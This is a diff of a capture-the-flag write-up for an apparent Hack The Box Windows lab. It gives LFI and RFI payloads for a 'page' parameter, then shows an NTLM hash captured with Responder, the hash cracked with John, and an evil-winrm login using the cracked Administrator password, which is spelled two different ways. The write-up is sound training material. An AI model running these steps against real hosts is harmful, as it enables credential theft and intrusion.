@@ -24,24 +24,31 @@ PORT     STATE SERVICE    VERSION
 |_http-server-header: Microsoft-HTTPAPI/2.0
 7680/tcp open  pando-pub?
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
-
 ```
+
+Thus, the scripting language used is PHP.
+
     php
 
 <span style="color:cyan">**Question 3**</span>: What is the name of the URL parameter which is used to load different language versions of the webpage?
 
-the name of the URL parameter to do so, is `page`
+The name of the URL parameter used to load different language versions of the webpage is page.
  
     page
 
 <span style="color:cyan">**Question 4**</span>: Which of the following values for the `page` parameter would be an example of exploiting a Local File Include (LFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"
 
+The value that would be an example of exploiting a Local File Include (LFI) vulnerability is:
+
     ../../../../../../../../windows/system32/drivers/etc/hosts
 
+This exploits the application by trying to include files from the server’s file system.
 
 <span style="color:cyan">**Question 5**</span>: Which of the following values for the `page` parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"
 
     //10.10.14.6/somefile
+
+This allows an attacker to include files from a remote server, potentially compromising the application.
 
 <span style="color:cyan">**Question 6**</span>: What does NTLM stand for?
 
@@ -63,12 +70,52 @@ In the Responder utility, the -I flag is used to specify the network interface.
 
 <span style="color:cyan">**Question 9**</span>: What is the password for the administrator user?
 
+To find the administrator password, I first run the command `ip a` to get a detailed list of available network interfaces:
 
+```cmd
+cmd: ip a
 
-  
+tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
+    link/none 
+    inet 10.10.15.180/23 scope global tun0
+       valid_lft forever preferred_lft forever
+    inet6 dead:beef:2::11b2/64 scope global 
+       valid_lft forever preferred_lft forever
+    inet6 fe80::acd2:99f2:9340:e8f6/64 scope link stable-privacy proto kernel_ll 
+       valid_lft forever preferred_lft forever
+```
+
+At this point, I use Responder to intercept the website using the network interface `tun0`:
+
+```cmd
+cmd: sudo responder -I tun0 -v
+```
+
+Now, taking advantage of the ability to change the language on the site `unika.htb`, I attempt an `RFI` attack, leveraging the output from `Responder`. I see the following in the terminal, which contains the hashed password:
+
+```cmd
+Administrator::RESPONDER:a0000050b7824dc2:7DF339DFFAED8C5DFA073D0D3A9D1622:010100000000000000E6E5E06F0BDB01178991186750514B0000000002000800450041005100530001001E00570049004E002D0046004200500042004500380054004E004700360044000400...
+```
+
+At this point, I use `John the Ripper` to try to recover the administrator's password: 
+
+```cmd
+cmd : sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash
+```
+
+Finally, I find the password:
+
+    baddminton (Administrator)
 
 <span style="color:cyan">**Question 10**</span>: We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?
 
- 
+The answer to this question is already contained in the output of the nmap command run earlier, which shows that port 5985 is active.
 
 <span style="color:cyan">**Question 11**</span>: Submit root flag
+
+At this point, knowing the username and password, I can use `evil-winrm` to connect to the Windows machine, access it, and find the flag.
+
+```cmd
+cmd : sudo evil-winrm -u Administrator -p badminton -i 10.129.217.61
+```
+By navigating through the file system, I find the file flag.txt which contains the flag!
